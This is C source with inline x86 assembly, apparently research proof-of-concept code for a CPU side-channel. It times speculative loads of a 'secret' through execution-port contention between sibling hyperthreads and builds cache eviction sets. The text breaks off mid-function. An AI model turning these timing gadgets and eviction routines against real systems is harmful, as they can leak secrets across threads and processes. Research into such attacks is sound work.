// compile with "gcc -std=gnu99 -o rr obj/util.o -O3 rrRepl.c -lm -lrt -lpthread"
// outputs a CSV, one line for each test with all data points
// cat /sys/devices/system/cpu/cpu0/topology/thread_siblings_list

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <error.h>
#include <errno.h>
#include <immintrin.h>

#define INNER_ITER 10
#define OUTER_ITER 10

#define LOOPS   1000
#define VIC     0
#define ATKS    2
#define ATKD    7
#define CLK     1

int timez = 0;
int my_set = 33;
extern support_asm_fn();

float sAB_ex[500];
float sAB_du[500];
float sBA_ex[500];
float sBA_du[500];
float cAB_ex[500];
float cAB_du[500];
float cBA_ex[500];
float cBA_du[500];
float mAB_ex[500];
float mAB_du[500];
float mBA_ex[500];
float mBA_du[500];

unsigned int __attribute__ ((aligned (512))) array[8] = {0,1,2,3,4,5,6,7};
double __attribute__ ((aligned (512))) val_array[4] = {1.0,2.0,3.0,5.0};

#ifndef VIC
#error "edit source to define ids of sibling hyperthreads"
#endif
int vic_id;
int atk_id;
volatile void *attackerAddr[30];
volatile unsigned int **bppppppp;
volatile unsigned int **bpppppp;
volatile unsigned int **bppppp;
volatile unsigned int **bpppp;
volatile unsigned int **bppp;
volatile unsigned int **bpp;
volatile unsigned int *bp;
volatile unsigned int timeA, timeB;

volatile unsigned int flag;
volatile unsigned int ticks;
volatile unsigned int a1ticks;
volatile unsigned int a2ticks;
volatile unsigned int brcond;
volatile unsigned int* brcondptr = &brcond;
volatile unsigned int** brcondptrptr = &brcondptr;
volatile unsigned int*** brcondptrptrptr = &brcondptrptr;
volatile unsigned int secret;
volatile unsigned int safe_secret;
volatile unsigned int mask;
volatile unsigned int * addrAold;
volatile unsigned int * addrBold;
unsigned int bcheck = 20;
volatile unsigned int syncflag = 0;
unsigned int __attribute__ ((aligned (512))) chessboard[8] = {0,1,2,3,4,5,6,7};


int __attribute__((noinline)) pointer_chase_rdtsc(void)
{
	volatile unsigned int *t = &ticks;
	unsigned int cycle;
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	unsigned int time;

	asm(
	R"(
	lfence
	lfence
	lfence
	vzeroall
	vmovdqa (%2), %%ymm0
	xor %%rax, %%rax

	//mov %4, %%rsi
	mov %5, %%r13
  
	mov (%1), %%rbx
	clflush (%%rbx)
	mov (%%rbx), %%rbx
	clflush (%%rbx)
	mov (%%rbx), %%rbx
	clflush (%%rbx)
	mov (%%rbx), %%rbx
	clflush (%%rbx)

	.REPT	1024
		NOP
	.ENDR

	xor %%rax, %%rax
	lfence
	rdtsc
	movl (%%r13), %%r12d
	lfence
	//mov %%eax, %%r12d

	mov (%1), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%r8

	//mov %%r8d, %%eax
	//movl (%%r13,%%rax,1), %%r8d
	//sub %%r12d, %%r8d
	//movl %%r8d, %4

	lfence
	rdtsc
	lfence
	sub %%r12d, %%eax
	mov %%eax, %3


)"
        : "+r"(addrA), "+r"(bppppp), "+r"(indicies), "=r" (time), "=r"(cycle), "+r"(t)
        : 
        : "%r12", "%r13", "%eax", "%ebx", "%ecx", "%edx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
);
	//printf(",%d", time);
	//printf(",%d", cycle);
	return time;
}

int __attribute__((noinline)) pointer_chase(void)
{
	volatile unsigned int *t = &ticks;
	unsigned int cycle;
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	unsigned int time;

	asm(
	R"(
	lfence
	lfence
	lfence
	vzeroall
	vmovdqa (%2), %%ymm0
	xor %%rax, %%rax

	//mov %4, %%rsi
	mov %5, %%r13
  
	mov (%1), %%rbx
	clflush (%%rbx)
	mov (%%rbx), %%rbx
	clflush (%%rbx)
	mov (%%rbx), %%rbx
	clflush (%%rbx)
	mov (%%rbx), %%rbx
	clflush (%%rbx)

	.REPT	1024
		NOP
	.ENDR

	xor %%rax, %%rax
	lfence
	rdtsc
	movl (%%r13), %%r12d
	lfence
	//mov %%eax, %%r12d

	mov (%1), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%r8

	mov %%r8d, %%eax
	movl (%%r13,%%rax,1), %%r8d
	sub %%r12d, %%r8d
	movl %%r8d, %4

	//lfence
	//rdtsc
	//lfence
	//sub %%r12d, %%eax
	//mov %%eax, %3


)"
        : "+r"(addrA), "+r"(bppppp), "+r"(indicies), "=r" (time), "=r"(cycle), "+r"(t)
        : 
        : "%r12", "%r13", "%eax", "%ebx", "%ecx", "%edx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
);
	//printf(",%d", time);
	//printf(",%d", cycle);
	return cycle;
}

int __attribute__((noinline)) load_A_no(void)
{
	volatile unsigned int *t = &ticks;
	unsigned int cycle;
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	unsigned int time;

	asm(
 	R"(
	lfence
	lfence
	lfence
        vzeroall
	vmovdqa (%2), %%ymm0
	mov %0, %%r8
	xor %%rax, %%rax
	lfence
	//rdtsc
        movl (%5), %4
	lfence
	//mov %%eax, %%r12d
	
.REPT   38	
        vsqrtpd %%ymm1,%%ymm1
.ENDR
        vmovq %%xmm1, %%rax
	movl (%0,%%rax,1), %%r13d

        mov %%r13d, %%eax
        movl (%5,%%rax,1), %%r13d
        sub %4, %%r13d
        movl %%r13d, %4

	//lfence
	//rdtsc
	//lfence
	//sub %%r12d, %%eax
	//mov %%eax, %3

)"
        : "+r"(addrA), "+r"(bppppppp), "+r"(indicies), "=r" (time), "=r"(cycle), "+r"(t)
        : 
        : "%r12", "%r13", "%eax", "%ebx", "%ecx", "%edx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
);
	//printf("time pointer_chase = %d\n", time);
	//printf(",%d", cycle);
	return cycle;
}

int __attribute__((noinline)) load_A_con(void)
{
	volatile unsigned int *t = &ticks;
	unsigned int cycle;
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	unsigned int time;

	asm(
 	R"(
	lfence
	lfence
	lfence
        vzeroall
	vmovdqa (%2), %%ymm0
	mov %0, %%r8
	xor %%rax, %%rax
	lfence
	//rdtsc
        movl (%5), %4
	lfence
	//mov %%eax, %%r12d
	
.REPT   38	
        vsqrtpd %%ymm1,%%ymm1
.ENDR
        vmovq %%xmm1, %%rax
	movl (%0,%%rax,1), %%r13d

        mov %%r13d, %%eax
        movl (%5,%%rax,1), %%r13d
        sub %4, %%r13d
        movl %%r13d, %4

.REPT	8
        vsqrtpd %%ymm2,%%ymm2
        vsqrtpd %%ymm3,%%ymm3
        vsqrtpd %%ymm4,%%ymm4
        vsqrtpd %%ymm5,%%ymm5
        vsqrtpd %%ymm6,%%ymm6
        vsqrtpd %%ymm7,%%ymm7
        vsqrtpd %%ymm8,%%ymm8
        vsqrtpd %%ymm9,%%ymm9
        vsqrtpd %%ymm10,%%ymm10
        vsqrtpd %%ymm11,%%ymm11
        vsqrtpd %%ymm12,%%ymm12
        vsqrtpd %%ymm13,%%ymm13
        vsqrtpd %%ymm14,%%ymm14
        vsqrtpd %%ymm15,%%ymm15 
.ENDR
	//lfence
	//rdtsc
	//lfence
	//sub %%r12d, %%eax
	//mov %%eax, %3

)"
        : "+r"(addrA), "+r"(bppppppp), "+r"(indicies), "=r" (time), "=r"(cycle), "+r"(t)
        : 
        : "%r12", "%r13", "%eax", "%ebx", "%ecx", "%edx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
);
	//printf("time pointer_chase = %d\n", time);
	//printf(",%d", cycle);
	return cycle;
}


int __attribute__((noinline)) dummy_AB(void)
{
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];
	int result;

	asm(
 	R"(

	vzeroall
	lfence
	lfence
	lfence
	vzeroall
	mov (%0), %%rbx

	.REPT   50	
		vsqrtpd %%ymm1,%%ymm1
	.ENDR
	vmovq %%xmm1, %%rax
	movl (%1,%%rax,1), %%ecx

	lfence
	lfence
	lfence
	
	movl %%ecx, %2

	)"
	: "+r"(addrA), "+r"(addrB), "=r"(result)
	: 
	: "%rax", "%rbx", "%rcx", "%ymm1"
	);

	return result;
}

int __attribute__((noinline)) dummy_BA(void)
{
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];
	int result;

	asm(
 	R"(

	vzeroall
	lfence
	lfence
	lfence
	vzeroall
	mov (%1), %%rbx

	.REPT   50	
		vsqrtpd %%ymm1,%%ymm1
	.ENDR
	vmovq %%xmm1, %%rax
	movl (%0,%%rax,1), %%ecx

	lfence
	lfence
	lfence
	
	movl %%ecx, %2

	)"
	: "+r"(addrA), "+r"(addrB), "=r"(result)
	: 
	: "%rax", "%rbx", "%rcx", "%ymm1"
	);

	return result;
}

int __attribute__((noinline)) no_contention_victim_time(void)
{
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	volatile unsigned int *t = &ticks;
	unsigned int cycle;

	asm(
 	R"(
  
	lfence
	lfence
	lfence
	vzeroall
	xor %%r8, %%r8
	vmovdqa (%2), %%ymm0

	mov (%1), %%rbx
	clflush (%%rbx)
	mov (%%rbx), %%rbx
	clflush (%%rbx)
	mov (%%rbx), %%rbx
	clflush (%%rbx)
	mov (%%rbx), %%rbx
	clflush (%%rbx)
	.REPT	512
		NOP
	.ENDR

	lfence
	movl (%4), %%r12d 
	lfence

	mov (%1), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx

	mov %%ebx, %%eax
	movl (%4,%%rax,1), %%r8d	

	.REPT   38	
		vsqrtpd %%ymm1,%%ymm1
	.ENDR
	vmovq %%xmm1, %%rax
	movl (%0,%%rax,1), %%ecx

	lfence
	lfence
	lfence

	sub %%r12d, %%r8d
	movl %%r8d, %3

	)"
        : "+r"(addrA), "+r"(bppppp), "+r"(indicies), "=r"(cycle), "+r"(t)
        : 
        : "%rax", "%rbx", "%r8", "%r12", "%eax", "%ebx", "%ecx", "%edx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
	);
	return cycle;
}


int __attribute__((noinline)) contention_victim_time(void)
{
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	volatile unsigned int *t = &ticks;
	unsigned int cycle;

	asm(
 	R"(

	vzeroall
	vmovdqa (%2), %%ymm0  
	lfence
	lfence
	lfence

	mov (%1), %%rbx
	clflush (%%rbx)
	mov (%%rbx), %%rbx
	clflush (%%rbx)
	mov (%%rbx), %%rbx
	clflush (%%rbx)
	mov (%%rbx), %%rbx
	clflush (%%rbx)
	.REPT	512
		NOP
	.ENDR

	lfence
	movl (%4), %%r12d 
	lfence

	mov (%1), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx

	mov %%ebx, %%eax
	movl (%4,%%rax,1), %%r8d	

	.REPT   38	
		vsqrtpd %%ymm1,%%ymm1
	.ENDR
	vmovq %%xmm1, %%rax
	movl (%0,%%rax,1), %%ecx

	.REPT	8
		vsqrtpd %%ymm2,%%ymm2
		vsqrtpd %%ymm3,%%ymm3
		vsqrtpd %%ymm4,%%ymm4
		vsqrtpd %%ymm5,%%ymm5
		vsqrtpd %%ymm6,%%ymm6
		vsqrtpd %%ymm7,%%ymm7
		vsqrtpd %%ymm8,%%ymm8
		vsqrtpd %%ymm9,%%ymm9
		vsqrtpd %%ymm10,%%ymm10
		vsqrtpd %%ymm11,%%ymm11
		vsqrtpd %%ymm12,%%ymm12
		vsqrtpd %%ymm13,%%ymm13
		vsqrtpd %%ymm14,%%ymm14
		vsqrtpd %%ymm15,%%ymm15 
	.ENDR

	lfence
	lfence
	lfence

	sub %%r12d, %%r8d
	movl %%r8d, %3

	)"
        : "+r"(addrA), "+r"(bppppp), "+r"(indicies), "=r"(cycle), "+r"(t)
        : 
        : "%rax", "%rbx", "%r8", "%r12", "%eax", "%ebx", "%ecx", "%edx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
	);
	return cycle;
}

int __attribute__((noinline)) no_contention_victim(void)
{
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	volatile unsigned int *t = &ticks;
	unsigned int cycle;

	asm(
 	R"(

	vzeroall
	vmovdqa (%2), %%ymm0  
	lfence
	lfence
	lfence

	mov (%1), %%rbx
	clflush (%1)
	mov (%%rbx), %%rcx
	clflush (%%rbx)
	mov %%rcx, %%rbx
	mov (%%rbx), %%rcx
	clflush (%%rbx)
	mov %%rcx, %%rbx
	mov (%%rbx), %%rcx
	clflush (%%rbx)
	mov %%rcx, %%rbx
	.REPT	512
		NOP
	.ENDR

	mov (%1), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx

	.REPT   32  #OVER1	
		vsqrtpd %%ymm1,%%ymm1
	.ENDR
	vmovq %%xmm1, %%rax
	movl (%0,%%rax,1), %%ecx

	lfence
	lfence
	lfence

	movl %%ecx, %3

	)"
        : "+r"(addrA), "+r"(bppppp), "+r"(indicies), "=r"(cycle), "+r"(t)
        : 
        : "%rax", "%rbx", "%r8", "%r12", "%eax", "%ebx", "%ecx", "%edx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
	);
	return cycle;
}

int __attribute__((noinline)) contention_victim(void)
{
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	volatile unsigned int *t = &ticks;
	unsigned int cycle;

	asm(
 	R"(

	vzeroall
	vmovdqa (%2), %%ymm0  
	lfence
	lfence
	lfence

	mov (%1), %%rbx
	clflush (%1)
	mov (%%rbx), %%rcx
	clflush (%%rbx)
	mov %%rcx, %%rbx
	mov (%%rbx), %%rcx
	clflush (%%rbx)
	mov %%rcx, %%rbx
	mov (%%rbx), %%rcx
	clflush (%%rbx)
	mov %%rcx, %%rbx
	.REPT	512
		NOP
	.ENDR

	mov (%1), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx

	.REPT   32  #OVER2	
		vsqrtpd %%ymm1,%%ymm1
	.ENDR
	vmovq %%xmm1, %%rax
	movl (%0,%%rax,1), %%ecx

	.REPT	8
		vsqrtpd %%ymm2,%%ymm2
		vsqrtpd %%ymm3,%%ymm3
		vsqrtpd %%ymm4,%%ymm4
		vsqrtpd %%ymm5,%%ymm5
		vsqrtpd %%ymm6,%%ymm6
		vsqrtpd %%ymm7,%%ymm7
		vsqrtpd %%ymm8,%%ymm8
		vsqrtpd %%ymm9,%%ymm9
		vsqrtpd %%ymm10,%%ymm10
		vsqrtpd %%ymm11,%%ymm11
		vsqrtpd %%ymm12,%%ymm12
		vsqrtpd %%ymm13,%%ymm13
		vsqrtpd %%ymm14,%%ymm14
		vsqrtpd %%ymm15,%%ymm15 
	.ENDR

	lfence
	lfence
	lfence

	movl %%ecx, %3

	)"
        : "+r"(addrA), "+r"(bppppp), "+r"(indicies), "=r"(cycle), "+r"(t)
        : 
        : "%rax", "%rbx", "%r8", "%r12", "%eax", "%ebx", "%ecx", "%edx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
	);
	return cycle;
}


int __attribute__((noinline)) contentionX_victim(void)
{
	volatile unsigned int *t = &ticks;
	volatile unsigned int *s = &secret;
	volatile unsigned int **b = &brcondptr;
	volatile unsigned int *m = &mask;
	unsigned int cycle;
	unsigned int *check = &bcheck;
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];

	double result;

	unsigned int *indicies = &array[0];
	double *values = &val_array[0];


	asm(
	R"(

	vzeroall
	lfence
	lfence
	lfence
	movl (%5), %%r11d
	movl (%6), %%r12d
	mov %4, %%r8
	mov %3, %%rdx

  mov (%1), %%rbx
  clflush (%1)
  mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
  mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
  mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx

	.REPT	1024
		NOP
	.ENDR

	clflush (%%r8)	


	mov (%1), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx

	.REPT   30  #OHARE	
		vsqrtpd %%ymm1,%%ymm1
	.ENDR
	vmovq %%xmm1, %%rax
	movl (%0,%%rax,1), %%ecx

	mov (%%r8), %%rbx
	mov (%%rbx), %%rax
	cmp %%eax, %%r11d
	jle done

	movl (%%rdx), %%eax




	done:	movl %%ecx, %2
			clflush (%4)
			clflush (%%rbx)
	)"
        : "+r"(addrA), "+r"(bppppp), "=r"(cycle), "+r"(s), "+r"(b), "+r"(check), "+r"(m)
        : 
        : "%r11", "%r12", "%rax", "%rbx", "%rcx", "%r8", "%rdx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
	);
	return cycle;
}

int __attribute__((noinline)) contentionS_victim(void)
{
	volatile unsigned int *t = &ticks;
	volatile unsigned int *s = &secret;
	volatile unsigned int **b = &brcondptr;
	volatile unsigned int *m = &mask;
	unsigned int cycle;
	unsigned int *check = &bcheck;
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];

	double result;

	unsigned int *indicies = &array[0];
	double *values = &val_array[0];


	asm(
	R"(

	vzeroall
	lfence
	lfence
	lfence
	movl (%5), %%r11d
	movl (%6), %%r12d
	mov %4, %%r8
	mov %3, %%rdx

	mov (%1), %%rbx
	clflush (%%rbx)
	mov (%%rbx), %%rbx
	clflush (%%rbx)
	mov (%%rbx), %%rbx
	clflush (%%rbx)
	mov (%%rbx), %%rbx
	clflush (%%rbx)
	.REPT	1
		NOP
	.ENDR

	clflush (%%r8)	


	mov (%1), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx

	.REPT   20  #OHARE	
		vsqrtpd %%ymm1,%%ymm1
	.ENDR
	vmovq %%xmm1, %%rax
	movl (%0,%%rax,1), %%ecx

	mov (%%r8), %%rbx
	mov (%%rbx), %%rax
	cmp %%eax, %%r11d
	jle donez

	movl (%%rdx), %%eax
	and %%r12d, %%eax
	vmovq %%rax, %%xmm2
	vsqrtpd %%ymm2,%%ymm2

	.REPT	10
		vsqrtpd %%ymm2,%%ymm3
		vsqrtpd %%ymm2,%%ymm4
		vsqrtpd %%ymm2,%%ymm5
		vsqrtpd %%ymm2,%%ymm6
		vsqrtpd %%ymm2,%%ymm7
		vsqrtpd %%ymm2,%%ymm8
		vsqrtpd %%ymm2,%%ymm9
		vsqrtpd %%ymm2,%%ymm10
		vsqrtpd %%ymm2,%%ymm11
		vsqrtpd %%ymm2,%%ymm12
		vsqrtpd %%ymm2,%%ymm13
		vsqrtpd %%ymm2,%%ymm14
		vsqrtpd %%ymm2,%%ymm15 
	.ENDR

	donez:	movl %%ecx, %2
			clflush (%4)
			clflush (%%rbx)
	)"
        : "+r"(addrA), "+r"(bppppp), "=r"(cycle), "+r"(s), "+r"(b), "+r"(check), "+r"(m)
        : 
        : "%r11", "%r12", "%rax", "%rbx", "%rcx", "%r8", "%rdx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
	);
	return cycle;
}

/* EVSETS CODE */

#include "util.h"
#include <unistd.h>
#include <sys/mman.h> 
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#define BUF_SIZE 400 * 1024UL * 1024  // Size of the memory buffer -> ? * 1MB
#define INTERRUPT_THRESHOLD 1000	  // Machine specific; above this number of cycles we ignore the timing
static int cache_miss_treshold = 200; // Machine specific; above this number of cycles we count as a cache miss

#define CALIBRATION_REPETITIONS 100000 // Used to calibrate_cache_miss_threshold the treshold above
#define TEST_REPETITIONS 200 // Used to test an eviction set
#define MAX_REPS_BACK 100	// Used to reduce an eviction set

bool debug = false;

// This code of accessing the addresses in the eviction set can be tuned.
// Prior work (ARMageddon, Rowhammer.js, flush+flush) suggests accessing addresses using
// zig-zag orderings such as 1-2-3-1-2-3 or 1-2-1-2-1-2, either in assembly or C.
//
// Eviction works also when accessing addresses linearly, but it is slower / needs more addresses.
// Ultimately, the best approach depends on the replacement policy.
// TODO: find the strategy that works best for the machine
static void traverse_eviction_set(struct Node *ptr)
{
	/*
	while (ptr && ptr->next && ptr->next->next) {
		maccess(ptr->address);
		maccess(ptr->next->address);
		maccess(ptr->next->next->address);
		maccess(ptr->address);
		maccess(ptr->next->address);
		maccess(ptr->next->next->address);
		maccess(ptr->address);
		maccess(ptr->next->address);
		maccess(ptr->next->next->address);
		ptr = ptr->next;
	}
*/
 
  while(ptr != NULL) {
    maccess(ptr->address);
	asm volatile("lfence\n");
    maccess(ptr->address);
	asm volatile("lfence\n");
    ptr = ptr->next;
  }

}

/*
static int test_replacement_set(void)
{
	int i = 0, ret = 0, latency = 0, total = 0, interrupt = 0;
	for (i = 0; i < TEST_REPETITIONS; i++) {
		maccess(victim);
		maccess(victim);
		maccess(victim);
		maccess(victim);

		traverse_eviction_set(addr_set);

		maccess(victim + 222); // page walk
		latency = time_access(victim);

		if (latency < INTERRUPT_THRESHOLD) {
			if (debug) {
				printf("%" PRIu32 "\n", latency);
			}

			total += latency;
		} else {
			interrupt++;
		}
	}

	ret = (float)total / (TEST_REPETITIONS - interrupt);

	if (debug) {
		printf("Average: %" PRIu32 "\n", ret);
	}

	return ret > cache_miss_treshold;
}
*/

void print_eviction_set(struct Node *eviction_set, int len)
{
 	struct Node* start = eviction_set;
	struct Node* temp = start;
	printf("[+] Eviction Set: %d\n", len);
	printf("[ ] %p\n", temp->address);
	for(int i = 0; i < len-1; i++) {
    if(temp == NULL) {
      printf("[!] PrintError: NULL ADDRESS\n");
      exit(1);
    }
    temp = temp->next;
		printf("[ ] %p ", temp->address);
    int cache_set1 = get_cache_set_index((uint64_t)temp->address, 1);
    int cache_set2 = get_cache_set_index((uint64_t)temp->address, 2);
    printf(" L1[%d] L2[%d]\n", cache_set1, cache_set2);
	}
  return;
}

/*static int test_sequence(struct Node *addr_set, void *addrA, void *addrB, int * sequence, int length)
{
	int i = 0, ret1 = 0, latency1 = 0, total1 = 0, interrupt1 = 0;
 	int ret2 = 0, latency2 = 0, total2 = 0, interrupt2 = 0;
  struct Node* ptr = addr_set;
  int iter = 0;
  
  void *addrpool[24]
  
  void *addr1 = ptr->address;
  void *addr2 = ptr->next->address;
  void *addr3 = ptr->next->next->address;
  void *addr4 = ptr->next->next->next->address;
  void *addr5 = ptr->next->next->next->next->address;
  void *addr6 = ptr->next->next->next->next->next->address;
  void *addr7 = ptr->next->next->next->next->next->next->address;
  void *addr8 = ptr->next->next->next->next->next->next->next->address;
  void *addr9 = ptr->next->next->next->next->next->next->next->next->address;
  void *addr10 = ptr->next->next->next->next->next->next->next->next->next->address;
  void *addr11 = ptr->next->next->next->next->next->next->next->next->next->next->address;
  ptr = addr_set = ptr->next->next->next->next->next->next->next->next->next->next->next;
  void *addr12 = ptr->address;
  void *addr13 = ptr->next->address;
  void *addr14 = ptr->next->next->address;
  void *addr15 = ptr->next->next->next->address;
  void *addr16 = ptr->next->next->next->next->address;
  void *addr17 = ptr->next->next->next->next->next->address;
  void *addr18 = ptr->next->next->next->next->next->next->address;
  void *addr19 = ptr->next->next->next->next->next->next->next->address;
  void *addr20 = ptr->next->next->next->next->next->next->next->next->address;
  void *addr21 = ptr->next->next->next->next->next->next->next->next->next->address;
  void *addr22 = ptr->next->next->next->next->next->next->next->next->next->next->address;

  for (i = 0; i < TEST_REPETITIONS; i++) {
    for(int k = 0; k < length; k++) {
    
    
    
    }
  
  
  }
}*/

static int test_step0(struct Node *addr_set, void *addrA, void *addrB)
{
	int i = 0, ret1 = 0, latency1 = 0, total1 = 0, interrupt1 = 0;
 	int ret2 = 0, latency2 = 0, total2 = 0, interrupt2 = 0;
  struct Node* ptr = addr_set;
  int iter = 0;
  void *addr1 = ptr->address;
  void *addr2 = ptr->next->address;
  void *addr3 = ptr->next->next->address;
  void *addr4 = ptr->next->next->next->address;
  void *addr5 = ptr->next->next->next->next->address;
  void *addr6 = ptr->next->next->next->next->next->address;
  void *addr7 = ptr->next->next->next->next->next->next->address;
  void *addr8 = ptr->next->next->next->next->next->next->next->address;
  void *addr9 = ptr->next->next->next->next->next->next->next->next->address;
  void *addr10 = ptr->next->next->next->next->next->next->next->next->next->address;
  void *addr11 = ptr->next->next->next->next->next->next->next->next->next->next->address;
  void *addr12 = ptr->next->next->next->next->next->next->next->next->next->next->next->address;
	int latenci[12];
	for (i = 0; i < TEST_REPETITIONS; i++) {
    
	_mm_clflush(addr1);
	_mm_clflush(addr2);
	_mm_clflush(addr3);
	_mm_clflush(addr4);
	_mm_clflush(addr5);
	_mm_clflush(addr6);
	_mm_clflush(addr7); 
	_mm_clflush(addr8);
	_mm_clflush(addr9);
	_mm_clflush(addr10);
	_mm_clflush(addr11);
	_mm_clflush(addr12);
	_mm_clflush(addrA);

	//asm volatile("wbinvd\n");

	for(int q = 0; q < 100000; q++) {} 
    //maccess(addrA);
        
    maccess(addr1);
    maccess(addr2);
    maccess(addr3);
    maccess(addr4);
    maccess(addr5);
    maccess(addr6);
    maccess(addr7);
    maccess(addr8);
    maccess(addr9);
    maccess(addr10);
    maccess(addr11);
  
    maccess((uint64_t)addr1^0x8000);
    maccess((uint64_t)addr2^0x8000);
    maccess((uint64_t)addr3^0x8000);
    maccess((uint64_t)addr4^0x8000);
    maccess((uint64_t)addr5^0x8000);
    maccess((uint64_t)addr6^0x8000);
    maccess((uint64_t)addr7^0x8000);
    maccess((uint64_t)addr8^0x8000);
    maccess((uint64_t)addr9^0x8000);
    maccess((uint64_t)addr10^0x8000);
    maccess((uint64_t)addr11^0x8000);
    maccess((uint64_t)addr12^0x8000);

    maccess(addr1);
    maccess(addr2);
    maccess(addr3);
    maccess(addr4);
    maccess(addr5);
    maccess(addr6);
    maccess(addr7);
    maccess(addr8);
    maccess(addr9);
    maccess(addr10);
    maccess(addr11);

    maccess((uint64_t)addr1^0x8000);
    maccess((uint64_t)addr2^0x8000);
    maccess((uint64_t)addr3^0x8000);
    maccess((uint64_t)addr4^0x8000);
    maccess((uint64_t)addr5^0x8000);
    maccess((uint64_t)addr6^0x8000);
    maccess((uint64_t)addr7^0x8000);
    maccess((uint64_t)addr8^0x8000);
    maccess((uint64_t)addr9^0x8000);
    maccess((uint64_t)addr10^0x8000);
    maccess((uint64_t)addr11^0x8000);
    maccess((uint64_t)addr12^0x8000);

    maccess(addr1);
    maccess(addr2);
    maccess(addr3);
    maccess(addr4);
    maccess(addr5);
    maccess(addr6);
    maccess(addr7);
    maccess(addr8);
    maccess(addr9);
    maccess(addr10);
    maccess(addr11);

    maccess((uint64_t)addr1^0x8000);
    maccess((uint64_t)addr2^0x8000);
    maccess((uint64_t)addr3^0x8000);
    maccess((uint64_t)addr4^0x8000);
    maccess((uint64_t)addr5^0x8000);
    maccess((uint64_t)addr6^0x8000);
    maccess((uint64_t)addr7^0x8000);
    maccess((uint64_t)addr8^0x8000);
    maccess((uint64_t)addr9^0x8000);
    maccess((uint64_t)addr10^0x8000);
    maccess((uint64_t)addr11^0x8000);
    maccess((uint64_t)addr12^0x8000);

    maccess(addr1);
